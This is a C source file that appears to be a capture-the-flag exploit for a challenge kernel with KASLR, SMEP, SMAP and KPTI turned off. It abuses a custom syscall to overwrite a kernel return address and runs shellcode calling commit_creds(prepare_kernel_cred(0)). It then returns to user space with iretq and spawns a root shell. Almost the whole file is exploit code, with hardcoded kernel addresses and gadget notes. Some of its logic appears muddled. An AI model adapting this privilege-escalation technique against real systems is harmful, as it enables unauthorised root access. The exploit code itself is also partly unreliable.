#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <errno.h>

// sp33d.play.hfsc.tf 7166
/*
	Mitigations:
	- NOKASLR
	- NOSMAP, NOSMEP
	- NOKPTI
	Flag in /root/flag
*/

#define KERNEL_BASE 0xffffffff81000000			// --> objdump -D vmlinux | head -n 10
#define PREPARE_KERNEL_CRED 0xffffffff81055de0	// --> cat /proc/kallsyms | grep prepare_kernel_cred
#define COMMIT_CREDS 0xffffffff81055f30			// --> cat /proc/kallsyms | grep commit_creds
#define POP_RDI_RET 0xffffffff811dbd5c			// pop rdi ; ret --> cat gadgets.txt
#define SWAPGS_POPRBP_RET 0xffffffff81400cdc 	// swapgs ; pop rbp ; ret --> cat gadgets.txt
#define ROP_BUF (0xffffffff81a00000 + 0x1000)	// Store ropchain in .data --> rabin2 -S vmlinux
// + 0x1000 is just for padding i guesS?

// 13  0x00c00000   0x77a00 0xffffffff81a00000   0x77a00 -rw- PROGBITS .data
// 28  0x00d05b20       0x0 0xffffffff81b06000   0xfa000 -rw- NOBITS   .bss

#define MAP_ANONYMOUS 0x20
#define PAGE_SIZE 0x1000

#define SYS_PWN 451		// Custom syscall made for the challenge (vuln??)

/* ---------- global placeholders for iretq frame ---------- */
unsigned long user_cs, user_ss, user_rflags, user_sp, user_rip;

/* give the assembler the 64‑bit immediates */
#define STR(x) #x
#define MOVABS(reg, val) "movabs " reg ", " STR(val) ";"

// Saving userland state
void save_userland_state(void){
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void root_shell(void) {
	puts("[+] returned to user land");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] got root (uid = %d)\n", uid);
    } else {
        printf("[!] failed to get root (uid: %d)\n", uid);
        exit(-1);
    }
    puts("[*] spawning shell");
    system("/bin/sh");
    exit(0);
}

void privesc() {
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        MOVABS("rax", PREPARE_KERNEL_CRED)
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        MOVABS("rax", COMMIT_CREDS)
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void kwrite8(uint64_t *where, uint64_t what)
{
    /* prime the user copy so when the kernel copies from us it writes `what` */
    *where = what;
    syscall(SYS_PWN, where);        // kernel thinks `where` is a kernel ptr
}

int main(void) {

	/* Map rwx alias of kernel .data so we can write our ropchain */
    if (mmap((void *)ROP_BUF, PAGE_SIZE,
             PROT_READ|PROT_WRITE|PROT_EXEC,
             MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) {
        perror("mmap ");
		return 1;
    }

	save_userland_state();
    user_rip = (unsigned long)root_shell;

	/* --- place the shell‑code in the RWX kernel page --- */
	memcpy((void *)ROP_BUF, (void *)privesc, 0x400);   		// 0x400 is plenty
	mprotect((void *)ROP_BUF, 0x400, PROT_READ|PROT_EXEC); 	// drop write if you like

	// Locate saved RIP on the current kernel stack
	uint64_t *saved_rip = (uint64_t *)((uint64_t)__builtin_frame_address(0) + 0x38);

	/* Overwrite return address with address of our shell‑code      */
    kwrite8(saved_rip, ROP_BUF);

	// Call vuln syscall
	syscall(SYS_PWN, 0);

	puts("[!] If we touched this, there's a mistake in the exploit.");
	return 0;
}
